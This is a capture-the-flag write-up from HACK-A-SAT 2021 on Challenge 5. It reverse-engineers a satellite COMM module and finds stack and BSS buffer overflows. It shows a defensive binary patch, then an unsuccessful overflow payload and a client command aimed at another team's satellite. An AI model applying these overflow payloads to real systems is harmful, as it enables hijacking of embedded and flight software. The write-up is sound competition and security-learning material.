# HACK-A-SAT 2021: Challenge 5

> Challenge 5 is getting deployed to your CDH! Keep the `SLA_TLM` app up and reporting telemetry, and use your access on other satellites to exploit other team's CDH!
>
> If you send data without the DANX flag, it will get routed to the new app!

## Comm Module in Sparc

At the beginning of the final event, we downloaded the `cfe_es_startup.scr` file for both the C&DH and ADCS subsystems. When the announcement for this challenge was made, we downloaded it again for the C&DH to see what new module had been installed:
```diff
diff -u CDH_cfe_es_startup.scr__5517__eb9233ca.cfdp CDH_cfe_es_startup.scr__5602__cf9e2250.cfdp
--- CDH_cfe_es_startup.scr__5517__eb9233ca.cfdp    2021-12-11 20:22:39.000000000 +0100
+++ CDH_cfe_es_startup.scr__5602__cf9e2250.cfdp    2021-12-12 12:22:54.000000000 +0100
@@ -17,6 +17,7 @@
 CFE_APP, /cf/lc.obj,           LC_AppMain,         LC,          80,   16384, 0x0, 0;
 CFE_APP, /cf/sbn_lite.obj,     SBN_LITE_AppMain,   SBN_LITE,    30,   81920, 0x0, 0;
 CFE_APP, /cf/mqtt.obj,         MQTT_AppMain,       MQTT,        40,   81920, 0x0, 0;
+CFE_APP, /cf/comm.obj,         COMM_AppMain,       COMM,        90,   16384, 0x0, 0;
 CFE_APP, /cf/sla_tlm.obj,      SLA_TLM_AppMain,    SLA_TLM,     90,   16384, 0x0, 0;
 CFE_APP, /cf/cf.obj,           CF_AppMain,         CF,         100,   81920, 0x0, 0;
```

The new module's name was `comm.obj`. We then used our scapy-based shell to download the new module:

```python
file_play_cfdp_cdh('/cf/comm.obj')
```

We then proceeded to reverse-engineer it to find what to do with it.

### Finding the vulnerability

The reverse engineering of the module was straightforward. The function `COMM_OBJ_Execute` is called in a loop and processes the packets.

While it wasn't clear at the beginning, it appeared that the goal was to make other teams' satellites send our own attribution key. The following function included in the code but never called could be very handy:
```c
void COMM_OBJ_UpdateSLAKey(uint32 key1,uint32 key2)
{
  CFE_SB_InitMsg(&CommObj->AttrPkt,0x9f9,0x14,1);
  (CommObj->AttrPkt).Header[0] = 0x09;
  (CommObj->AttrPkt).Header[1] = 0xf9;
  (CommObj->AttrPkt).AttrKey1 = key1;
  (CommObj->AttrPkt).AttrKey2 = key2;
  CFE_SB_TimeStampMsg(&CommObj->AttrPkt);
  CFE_SB_SendMsg(&CommObj->AttrPkt);
  CFE_EVS_SendEvent(0x79,2,"Sending Attr Update Packet via SB");
  return;
}
```

Right at the beginning of the `COMM_OBJ_Execute`, we can see some memory copy without any check on the size of the packet:
```c
    if (((MsgId == 0x444d) && (*(char *)((int)PktPtr + 2) == 'D')) &&
       (*(char *)((int)PktPtr + 3) == ':')) {
      CFE_PSP_MemCpy((CommObj->DemodPkt).Synch,PktPtr,PktLen);
      CFE_SB_TimeStampMsg(&CommObj->DemodPkt);
      CFE_SB_SendMsg(&CommObj->DemodPkt);
    }
    else if (((MsgId == 0x4d4f) && (*(char *)((int)PktPtr + 2) == 'D')) &&
            (*(char *)((int)PktPtr + 3) == ':')) {
      CFE_PSP_MemCpy((CommObj->ModPkt).Synch,PktPtr,PktLen);
      CFE_SB_TimeStampMsg(&CommObj->ModPkt);
      CFE_SB_SendMsg(&CommObj->ModPkt);
    }
```

The `Synch` field is at offset 12 of a 68-bytes packet structure, so we already have an overflow in the BSS section. We then checked if there were other usages of the `CFE_PSP_MemCpy` function in the same careless way. We indeed found another memory copy:
```c
void COMM_OBJ_ProcessSLA(uint16 PktLen,CFE_SB_Msg_t *PktPtr)
{
  char buf [16];

  CFE_EVS_SendEvent(0x79,2,"%x %x",buf,PktLen);
  CFE_PSP_MemCpy(buf,PktPtr,PktLen);
  CFE_EVS_SendEvent(0x79,2,&DAT_00011078);
  return;
}
```

This is an obvious stack-based buffer overflow. We checked when this function was called:
```c
    else if ((MsgId == 0x19e4) &&
            (((uint)*(byte *)((int)Message + 0xf) |
             (uint)*(byte *)((int)Message + 0xe) << 8 |
             (uint)*(byte *)((int)Message + 0xd) << 0x10 |
             (uint)*(byte *)((int)Message + 0xc) << 0x18) == 0x41414141)) {
      CFE_EVS_SendEvent(0x79,2,"received payload SLA TLM msg Status: %d ExecutionCount: %u",Status,
                        CommObj->ExecCnt);
      Message = PktPtr;
      OS_TaskDelay(1);
      COMM_OBJ_ProcessSLA(PktLen,PktPtr);
```

So we needed to send a packet with an ID of `0x19e4` and a starting payload of `'AAAA'` to trigger the vulnerability. From there, we had to leverage the buffer overflow in order to call `COMM_OBJ_UpdateSLAKey` with our key, and then clean everything so the module won't crash.

### Communicating with the COMM module of other teams

For this challenge, the `client` binary from challenge 3 was to be used again. This time, without using the DANX service flag. To send a message to another team satellite, the following command worked:

```sh
./client -k 5647008472405673096 -f ../other_teams_keys/team_1_rsa_priv.pem -i 1 -p 31337 -a 10.0.0.101 -m 41414141
```

We could now start to craft an exploit payload.

### Defense

Shortly after the module was deployed on all satellites, we had a crash with obvious SLA consequences and a loss of points. We investigated to try to defend against possibly DoS attempts. The function `COMM_OBJ_Execute` contained a `for` loop which displayed some bytes of the received message:

```c
    for (i = 0; i < 0x12; i = i + 1) {
      CFE_EVS_SendEvent(0x79,2,"[%d]:%x",i,*(undefined *)((int)PktPtr + i));
    }
```

In practice, this `for` loop was causing issues because too many event messages were sent at once: only the first two bytes of the received message were displayed.
This enabled us to find out that these bytes were `19 e4`, matching the message ID for `COMM_PAYLOAD_SLA`.
To protect ourselves from the other teams, we first patched this code by replacing the opcodes for the `for` loop to add this:

```c
if (MsgId == 0x19e4) {
    return;
}
```

Later, the patch was updated to:
```c
    if (MsgId != 0x19e4 || PktLen < 0x10) {
      CFE_EVS_SendEvent(0x79,2,"[%d]:%x",i,*(undefined *)((int)PktPtr + i));
      [...]
    }
```

This way, no other team could exploit the buffer overflow vulnerability in our module :)

We uploaded the patched module and restarted the COMM module using our scapy shell:

```python
file_upload_cfdp_file_cdh("/cf/comm_patch.obj", "CDH_comm.obj-PATCHED")
stop_app_cdh("COMM")
time.sleep(1)
start_app_cdh("COMM", "COMM_AppMain", "/cf/comm_patch.obj", 90, stack_size=16384)
```

This appeared to work. Actually, it worked so well that we wasted a lot of time trying to understand why we couldn't debug our exploit on our satellite because of this. The lack of sleep might have played a role...

## Exploit tentative

Last year, we successfully exploited a vulnerability on a Sparc system (<https://github.com/solar-wine/writeups/tree/master/Finals/Earth-based#exploiting-the-backdoor>).
We tried to reproduce this feat this year but did not achieve doing so :(

One of the major difficulties we faced was we did not know how the packet we wrote in the `./client` invocation was received by the COMM module: was it received as-is? Was it packed in a normal CCSDS message? Was it copied from an unusual offset?

At some point, we decided to patch the COMM module directly in memory to display relevant fields of the received packet, as the `for` loop which was supposed to help the participants did not work properly:

```python
# Use addresses relative to COMM_OBJ_Execute, loaded at 0x00010898 in the obj file.
# Patch the first loop to display only two bytes, to avoid dropping event messages
mem_write32_from_symbol_cdh("COMM_OBJ_Execute", 0x000109c0-0x00010898, 0x80A06001)

# Change:
#     00010dc8 c2 07 bf ec     lduw       [fp+PktPtr],g1
#     00010dcc c2 08 40 00     ldub       [g1+g0],g1
#     00010dd0 86 08 60 ff     and        g1,0xff,g3
#     00010dd4 c2 07 bf ec     lduw       [fp+PktPtr],g1
#     00010dd8 c2 08 60 01     ldub       [g1+0x1],g1
#     00010ddc 88 08 60 ff     and        g1,0xff,g4
#     00010de0 c2 07 bf ec     lduw       [fp+PktPtr],g1
#     00010de4 c2 08 60 0c     ldub       [g1+0xc],g1
# To:
#     00010dc8 c2 07 bf ec     lduw       [fp+-0x14],g1
#     00010dcc c2 00 60 0c     lduw       [g1+0xc],g1
#     00010dd0 86 10 00 01     mov        g1,g3
#     00010dd4 c2 07 bf ec     lduw       [fp+-0x14],g1
#     00010dd8 c2 00 60 10     lduw       [g1+0x10],g1
#     00010ddc 88 10 00 01     mov        g1,g4
#     00010de0 c2 07 bf ec     lduw       [fp+-0x14],g1
#     00010de4 c2 00 60 08     lduw       [g1+0x8],g1
mem_write32_from_symbol_cdh("COMM_OBJ_Execute", 0x00010dcc-0x00010898, 0xc200600c)
mem_write32_from_symbol_cdh("COMM_OBJ_Execute", 0x00010dd0-0x00010898, 0x86100001)
mem_write32_from_symbol_cdh("COMM_OBJ_Execute", 0x00010dd8-0x00010898, 0xc2006010)
mem_write32_from_symbol_cdh("COMM_OBJ_Execute", 0x00010ddc-0x00010898, 0x88100001)
mem_write32_from_symbol_cdh("COMM_OBJ_Execute", 0x00010de4-0x00010898, 0xc2006008)
```

This patch modified the parameters of a `CFE_EVS_SendEvent` call in the function `COMM_OBJ_Execute` to print the content of the 12 bytes between offsets 8 and 0x13 of the received message.

This enabled us to understand that the packet defined in the `client` invocation was in fact received at offset 0xc of the message!
So the CCSDS header (containing the message ID, its length...) was out of reach and all we needed to do was to send a message starting with `41414141` to trigger the call to the vulnerable `COMM_OBJ_ProcessSLA` function!

We tried to forge a suitable payload to call `COMM_OBJ_UpdateSLAKey` with our attribution key 0x4E5E3449595C8488:

```python
COMM_OBJ_UpdateSLAKey_addr = 0x414b3a00
my_new_sp = 0x406d5138 - 0x10
payload = struct.pack(">17I",
    0x41414141,
    0x00000000,  0x00000000,  0x00000000,  0x00000000,
    0x00000000,  0x00000000,  0x00000000,  0x00000000,
    0x4E5E3449,  0x595C8488,  0x00000000,  0x00000000,
    0x00000000,  0x00000000,  my_new_sp,  COMM_OBJ_UpdateSLAKey_addr - 8)
print(bytes(payload).hex())
```

When sending this payload, it did not seem to work, and we did not understand why.

```sh
./client -k 5647008472405673096 -f ../other_teams_keys/team_1_rsa_priv.pem -i 1 -p 31337 -a 10.0.0.101 -m 4141414100000000000000000000000000000000000000000000000000000000000000004e5e3449595c848800000000000000000000000000000000406d5128414b39f8
```

The stack pointer we used, `0x406d5128`, could have caused issues due to not being well aligned. Oops, exploiting Sparc systems is hard.
